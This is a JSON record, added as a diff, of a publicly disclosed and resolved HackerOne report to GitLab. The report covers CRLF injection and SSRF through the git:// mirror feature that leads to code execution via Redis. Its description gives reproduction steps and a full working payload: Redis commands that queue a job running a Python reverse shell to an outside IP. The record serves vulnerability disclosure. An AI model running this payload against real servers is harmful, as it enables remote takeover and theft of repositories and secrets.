@@ -1,0 +1,146 @@
+{
+  "id": 441090,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDEwOTA=",
+  "url": "https://hackerone.com/reports/441090",
+  "title": "CRLF injection & SSRF in git:// protocal lead to arbitrary code execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-11-15T05:33:36.293Z",
+  "submitted_at": "2018-11-15T05:33:36.293Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "chromium1337",
+    "url": "/chromium1337",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/kj4qb0hd3slvns8xbi40dujkp3ww/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-11-23T16:07:44.869Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-23T16:07:44.737Z",
+  "team_member_agreed_on_going_public_at": "2020-11-23T15:25:38.819Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nThe implementation of `git://` protocal in GitLab is vulnerable to CRLF injection and Server-Side Request Forgery. If the redis server is configured to listen on TCP socket (eg. port 6379), an attacker can abuse SSRF to manipulate redis server, injecting malicious payload into system_hook_push queue, which result in arbitrary code execution.\n\n**Description:** \nThis vulnerability is similar to @jobert 's https://hackerone.com/reports/299473 . GitLab patched the CRLF injection in HTTP header and introduced the UrlBlocker module to prevent HTTP requests going into intranet. But `git://` is not restricted to the UrlBlocker. \nThis gif shows a request sent to 127.0.0.1:2333 with multiple CRLF injected:\n{F375843}\n\n## Steps To Reproduce:\n  1. Follow [GitLab Docs](https://docs.gitlab.com/omnibus/settings/redis.html) to set up a redis server listening on `127.0.0.1:6379`\n  2. Sign in and create a project, go to project Settings -> Repository -> Mirroring repositories\n  3. Add a mirror repo, capture the POST request using BurpSuite or Fiddler or whatever you like, and modify the post param `project[remote_mirrors_attributes][0][url]` to:\n\n```\ngit://127.0.0.1:6379/\n multi\n sadd resque:gitlab:queues system_hook_push\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|/usr/bin/python3 -c \\\\\\\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\"118.89.198.146\\\\\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"]);\\\\\\\\\\'\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\n exec\n/bbbbb/ccccc\n```\n\n(Thanks to @jobert 's [payload](https://hackerone.com/reports/299473) again!)\n\n  4. Make a POST request to `/{username}/{project name}/mirror/update_now?sync_remote=true` to trigger the mirror action\n  5. Attacker will receive a reverse shell on 118.89.198.146 port 8000\n\n{F375845}\n\n## Impact\n\nSame as https://hackerone.com/reports/299473:\n> An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 375843,
+      "file_name": "2.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/375/843/ff9414fa50e54c353c4983810a8ac76a27651d38/2.gif?response-content-disposition=attachment%3B%20filename%3D%222.gif%22%3B%20filename%2A%3DUTF-8%27%272.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV6GL2AAM%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151647Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCSQFk7YTRTB1Dk2fMG5%2BNpVw%2F3n4oOor98wqSWxK8BfAIgJZmwAmS69EF0%2FsXT7lWcTGIuFboLiqxpG2u5fZlvYQUquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDP6aQlVbBctSvyv9JiqPBV3%2B2uiiBN8T2v33wu60Fc4DuyqQLkldn5WVGs%2FfqHUbEIYkJ9JtGQhS9y7bhVLSzPOkZqp8WIKuFC0SI8HBxQL%2FimgTROPGB7Y8mXTkKi84fToP%2FFcYYUUeGQYiISF9CDMSf0hOVAJVu%2FRAC2510Kuz9ohFjS8q9JaK%2B%2FX3i%2BS1h4M9ktTIby6pK7%2F%2BYs7YaLoFeg7qjR%2Bj4LHadIrUbHMgccmhnkrBdzCq%2BgGTMsC%2F4jseUSjccCUjCZpnwQnH5HhgdpS2q1EpUtkkTTXelAbeMJO2t2EQeZSwfVXJqqT7B6N1MMHl9mDaOZ9UFqRZ%2Bh1RfYqTbKvvdFQDdqULLhSwvxCkrhvaYne7j9JTnpgHa%2FtQOrPX4qKtLcIfKOrvN7Y0kBn%2BzzEQ9h2cvWqK%2FGoOqnh73%2BFou5iqFFca9E3qjH%2BuXYPEDDCzRgQWMLsaY27lXYyNmuW6hI%2BHuT77fz7dEm%2BnFKAmpcr%2BrS5Wv3AlTTLXx%2FFSmmJSTodPxlVTEJCciBJ4QGm32reFz5%2BgIUmOaP%2FA7FN9xy%2Fw8RqoC9aAVcLshGPVvCgRPWQzdpZw5xmlT949qKICVfLMeb9krDsp9ecRJgpro9LSUD0gSs2UmQjtX6fo3Vtt8Vz%2BSOXBGRYwRk%2BbAg%2Fd7jRvMBRGHB4noYpQWBbIEObRE6gtGE9ay7kIOSCmFbe8LEh5X1QwREXDh%2BDiz0tdBiXQvgijbN85NvneVTPs%2Bjb%2BpPwjBgUMvptGJhY1no5%2FjO71v5mg1UTzfBtA%2FJuEMfXp%2BsP9xyR3wMyOqG4xBnGiqMZjEVQYgJy9jduq8TTFhDnOXDqEis0hVJZ4UmxemvcqbUa2I7cxOzfPmSd1V8DSr9KBEz4woon9zwY6sQEye0YS5q%2FJ1zWfvg942Ms8rBjHxS7098VmJgrHOiAEzgbHrS5Xg1AbUXeJC3TgKpebco3bjQaxe9G5DxMNow%2BUwK6k4kOQw7mv1%2BCWNaxl%2BX78OKNh0JPqgfPxPupOqqEmBncr%2Bp9CfedP5lRL4f7kVzrIgY3BBvRipP81Ng5MtTrYi%2B%2FvFFzCv4mT84gc8Ot5gGQDtqLTlBvutrpl6iiZRfPW1tLG%2BFfyDV7E9tVeBlw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9323d6970362131d3973749702690b1349bf8ebcac6e907e0f13165812f25327",
+      "file_size": 1128937,
+      "type": "image/gif",
+      "moderated": null
+    },
+    {
+      "id": 375845,
+      "file_name": "1.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/375/845/11ff78f18d7a673322f22ec289b1206e583550d0/1.gif?response-content-disposition=attachment%3B%20filename%3D%221.gif%22%3B%20filename%2A%3DUTF-8%27%271.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV6GL2AAM%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151647Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQCSQFk7YTRTB1Dk2fMG5%2BNpVw%2F3n4oOor98wqSWxK8BfAIgJZmwAmS69EF0%2FsXT7lWcTGIuFboLiqxpG2u5fZlvYQUquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDP6aQlVbBctSvyv9JiqPBV3%2B2uiiBN8T2v33wu60Fc4DuyqQLkldn5WVGs%2FfqHUbEIYkJ9JtGQhS9y7bhVLSzPOkZqp8WIKuFC0SI8HBxQL%2FimgTROPGB7Y8mXTkKi84fToP%2FFcYYUUeGQYiISF9CDMSf0hOVAJVu%2FRAC2510Kuz9ohFjS8q9JaK%2B%2FX3i%2BS1h4M9ktTIby6pK7%2F%2BYs7YaLoFeg7qjR%2Bj4LHadIrUbHMgccmhnkrBdzCq%2BgGTMsC%2F4jseUSjccCUjCZpnwQnH5HhgdpS2q1EpUtkkTTXelAbeMJO2t2EQeZSwfVXJqqT7B6N1MMHl9mDaOZ9UFqRZ%2Bh1RfYqTbKvvdFQDdqULLhSwvxCkrhvaYne7j9JTnpgHa%2FtQOrPX4qKtLcIfKOrvN7Y0kBn%2BzzEQ9h2cvWqK%2FGoOqnh73%2BFou5iqFFca9E3qjH%2BuXYPEDDCzRgQWMLsaY27lXYyNmuW6hI%2BHuT77fz7dEm%2BnFKAmpcr%2BrS5Wv3AlTTLXx%2FFSmmJSTodPxlVTEJCciBJ4QGm32reFz5%2BgIUmOaP%2FA7FN9xy%2Fw8RqoC9aAVcLshGPVvCgRPWQzdpZw5xmlT949qKICVfLMeb9krDsp9ecRJgpro9LSUD0gSs2UmQjtX6fo3Vtt8Vz%2BSOXBGRYwRk%2BbAg%2Fd7jRvMBRGHB4noYpQWBbIEObRE6gtGE9ay7kIOSCmFbe8LEh5X1QwREXDh%2BDiz0tdBiXQvgijbN85NvneVTPs%2Bjb%2BpPwjBgUMvptGJhY1no5%2FjO71v5mg1UTzfBtA%2FJuEMfXp%2BsP9xyR3wMyOqG4xBnGiqMZjEVQYgJy9jduq8TTFhDnOXDqEis0hVJZ4UmxemvcqbUa2I7cxOzfPmSd1V8DSr9KBEz4woon9zwY6sQEye0YS5q%2FJ1zWfvg942Ms8rBjHxS7098VmJgrHOiAEzgbHrS5Xg1AbUXeJC3TgKpebco3bjQaxe9G5DxMNow%2BUwK6k4kOQw7mv1%2BCWNaxl%2BX78OKNh0JPqgfPxPupOqqEmBncr%2Bp9CfedP5lRL4f7kVzrIgY3BBvRipP81Ng5MtTrYi%2B%2FvFFzCv4mT84gc8Ot5gGQDtqLTlBvutrpl6iiZRfPW1tLG%2BFfyDV7E9tVeBlw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b62a5324e6cde859f1d18485ecfeefe1acbb66ea69b3ed63a8f784b8446ae6b8",
+      "file_size": 207021,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 21,
+  "voters": [
+    "porcupineyhairs",
+    "th3hidd3nmist",
+    "anhiu102",
+    "xploiterr",
+    "ali",
+    "sameerphad72",
+    "aryan2808",
+    "mik317",
+    "h4x0r_dz",
+    "bugdotexe",
+    "and 11 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
